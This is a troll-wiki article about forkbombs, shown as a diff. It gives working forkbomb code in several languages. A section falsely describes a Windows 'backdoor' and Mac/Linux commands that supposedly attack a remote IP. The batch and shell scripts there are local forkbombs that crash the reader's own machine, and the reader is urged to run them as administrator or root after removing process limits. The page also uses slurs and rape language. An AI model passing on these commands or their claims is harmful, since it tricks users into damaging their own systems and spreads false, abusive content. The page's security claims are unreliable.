@@ -1,0 +1,68 @@
+Forkbomb
+{{Haxor}}
+[[Image:Forkbomb.gif|thumb|200px|right|An example of [[doing it wrong|doing a forkbomb wrong]].]]
+[[Image:TOW_Forkbomb.png|thumb|200px|right|[[OH SHI-]]]]
+
+A '''forkbomb''' is a [[hax|program]] that creates [[over 9000]] copies of itself, thus completely [[pwn|hosing]] whatever computer it's run on. Forkbombs are commonly discovered by bored [[Computer Science III]] students, usually with [[epic fail|hilarious results]]. Forkbombs will completely fuck up a running system, but unless [[you]] managed to write it [[doing it wrong|completely wrong]], forkbombs don't do any lasting [[massive damage|damage]].
+
+
+==How to forkbomb==
+
+===C===
+<pre>int main() { while(1) { fork(); } return 0; }</pre>
+
+===[[YO DAWG|Perl]]===
+<pre>fork while fork</pre>
+
+===BASH===
+<pre>:(){ :|:& };:</pre>
+For Ubuntu, open the menu, go to accessories, hit terminal, and type this. then run away. or stick around.
+
+===Batch===
+<pre>%0|%0</pre>
+or
+<pre>:s
+start %0
+%0|%0
+goto :s</pre>
+or
+<pre>:A
+start
+goto A</pre>
+
+===Visual Basic (VBS)===
+<pre>do
+DIM objShell
+set objShell = wscript.createObject("wscript.shell")
+iReturn = objShell.Run("CMD /C loop.vbs", background , True)
+loop</pre>
+
+==How to forkbomb someone else==
+A little-known [[hax|backdoor]] in Windows lets you [[pwn|forkbomb]] anyone on the [[Internets]] who is running Windows with a few simple commands. Go on... you know they're [[asking for it]]. [[DO IT FAGGOT]]!
+
+===How to Break Windows===
+Here are the commands you need to run:
+<pre>
+if not exist REMOTE_IP set /p REMOTE_IP="Target plz? "
+:O
+%0|%0 %REMOTE_IP%
+goto O
+</pre>
+[[Cuntpaste]] that into [[Notepad]], saving it as nuke.bat. Then double-click nuke.bat. Type the [[IP address]] of the [[noob|poor sucker]] you're about to destroy, then watch as nuke.bat creates [[over 9000]] processes on said sucker's machine.
+
+'''Note:''' For extra lulz, [[Vista]] users should run nuke.bat as administrator. Running the scripts as administrator causes your target's machine to die [[at least 100]] times faster.
+
+===A Mac is fine too===
+Don't worry, Mac/Linux [[fanboi|fans]]. Using the built-in connection features of your shell, you can also participate in the [[DDoS|e-rape]] of people you hate. Just [[cuntpaste]] these three commands into a terminal:
+<pre>
+ulimit -u unlimited       # Remove any limits on sending packets
+export REMOTE_IP=0.0.0.0  # Replace 0.0.0.0 with the target IP
+_(){_|_&};_ $REMOTE_IP    # Open the connection and commence the rape
+</pre>
+Again, for maximum lulz, run the above from a root terminal (try running <code>sudo su</code> before the copypasta).
+
+
+==Did you know?==
+Forkbombs are one topic covered in [[Computer Science III]], along with <strike>[[DDoS]]ing</strike> [[ping]], [[IP address]]es, and other ways of being a [[1337]] [[epic fail|hax0r]].
+
+[[Category:Softwarez]]
